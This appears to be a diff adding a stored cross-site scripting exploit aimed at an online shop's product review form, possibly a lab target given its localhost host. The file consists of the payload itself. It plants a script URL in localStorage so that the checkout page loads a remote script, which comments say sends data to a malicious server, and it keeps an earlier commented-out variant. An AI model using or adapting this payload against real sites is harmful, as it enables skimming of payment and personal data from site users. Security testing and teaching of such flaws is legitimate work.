@@ -1,0 +1,30 @@
+<!--
+Stored XSS attack
+Vuln entrypoint: Unsanitised user input in /product_detail review form
+Exploit: Appends script to checkout page at /payment, loads the payload which sends data to malicious server
+
+This payload is entered into the review form
+--> 
+
+<!-- does not persist after /product/<product-id> -->
+<!-- with alerts
+<script>
+        let script = document.createElement("script");
+        console.log("script created");
+        script.src = "http://localhost:8888/payload";
+        console.log("script src set");
+        document.body.appendChild(script);
+        console.log("script appended");
+</script> -->
+
+<!-- exploiting session storage -->
+<script>
+    localStorage.setItem("payload", "http://localhost:8888/payload");
+    window.addEventListener("load", () =>{
+        if (window.location.pathname === "/checkout") {
+        let script = document.createElement("script");
+        script.src = localStorage.getItem("payload");
+        document.body.appendChild(script);
+    }
+    })
+</script>
